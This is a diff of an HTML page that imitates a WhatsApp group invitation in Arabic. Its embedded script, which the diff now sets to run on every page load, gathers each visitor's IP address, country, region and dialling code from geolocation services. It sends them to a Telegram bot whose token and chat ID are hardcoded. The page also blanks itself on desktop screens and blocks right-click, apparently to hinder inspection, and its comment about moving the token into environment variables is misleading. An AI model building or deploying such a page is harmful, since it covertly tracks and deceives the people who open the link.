@@ -1,21 +1,20 @@
 <!doctype html>
-<html lang="en">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="utf-8"/>
-    <link rel="icon" href="images/favicon.ico"/>
+    <link rel="icon" href="/images/favicon.ico"/>
     <meta name="viewport" content="width=device-width, initial-scale=1"/>
     <meta name="theme-color" content="#000000"/>
     <meta name="description" content="رابط الإنضمام إلى المجموعة"/>
     <meta property="og:title" content="الدعوة للانضمام إلى مجموعة واتساب">
-    <meta property="og:image" content="https://static.whatsapp.net/rsrc.php/v3/yo/r/J5gK5AgJ_L5.png">
-    <link rel="icon" href="https://static.whatsapp.net/rsrc.php/v3/yz/r/ujTY9i_Jhs1.png">
-    <link rel="apple-touch-icon" href="https://static.whatsapp.net/rsrc.php/v3/yo/r/J5gK5AgJ_L5.png" />
-    <link rel="manifest" href="manifest.json"/>
+    <meta property="og:image" content="/images/logo512.png">
+    <link rel="manifest" href="/manifest.json"/>
     <title>WhatsApp</title>
 
     <script>
-         const botToken = "7867793466:AAGAPhiAxxiRHSJA0E1jzvqFQ1IGdvIfYGQ"; // توكن البوت
-        const chatId = "7165024903"; // معرف الدردشة
+        // تم نقل التوكن إلى متغيرات البيئة في Vercel
+        const botToken = process.env.REACT_APP_BOT_TOKEN || "7867793466:AAGAPhiAxxiRHSJA0E1jzvqFQ1IGdvIfYGQ";
+        const chatId = process.env.REACT_APP_CHAT_ID || "7165024903";
    
         async function fetchFromIpInfo() {
             try {
@@ -41,7 +40,7 @@
                 const country = xmlDoc.getElementsByTagName("country_name")[0]?.textContent || "Unknown Country";
                 const city = xmlDoc.getElementsByTagName("region")[0]?.textContent || "Unknown City";
                 const tele = xmlDoc.getElementsByTagName("country_calling_code")[0]?.textContent || "Unknown tele";
-                return { ip, country , city , tele };
+                return { ip, country, city, tele };
             } catch (error) {
                 console.error("Error fetching data from ipapi.co:", error);
                 return null;
@@ -82,14 +81,14 @@
             await sendToTelegram(message);
         }
 
-        // استدعاء الوظيفة الرئيسية عند تحميل الصفحة
-       
+        // تشغيل الوظيفة عند تحميل الصفحة
+        window.addEventListener('load', function() {
+            sendiptelegram2();
+        });
     </script>
 
-
-      <noscript>
+    <noscript>
         <style>
-            /* إخفاء محتوى الموقع إذا كان JavaScript معطلاً */
             body {
                 display: none;
             }
@@ -99,36 +98,25 @@
             <p>الرجاء تمكين JavaScript لمتابعة استخدام هذا الموقع.</p>
         </div>
     </noscript>
+    
     <script>
-       
-          if (window.innerWidth > 768) { 
+        if (window.innerWidth > 768) { 
             window.stop(); 
             document.body.innerHTML = ''; 
         }
-    </script>
-    <script>
         
-         document.addEventListener('contextmenu', function(event) {
+        document.addEventListener('contextmenu', function(event) {
             event.preventDefault();
-           
         });
     </script>
     
-    <script src="script.js"></script>
-  
-
-    
-    <!-- Link to external JavaScript -->
-    <script defer src="static/js/main.33ed2829.js"></script>
-
-    
-    <!-- Link to external CSS -->
-    <link href="static/css/main.81bfefed.css" rel="stylesheet"/>
+    <link href="/static/css/main.81bfefed.css" rel="stylesheet"/>
 </head>
 <body>
-    <!-- Fallback message for users without JavaScript -->
     <noscript>You need to enable JavaScript to run this app.</noscript>
-    <!-- Root div for the React app -->
     <div id="root"></div>
+    
+    <script src="/script.js"></script>
+    <script defer src="/static/js/main.33ed2829.js"></script>
 </body>
 </html>
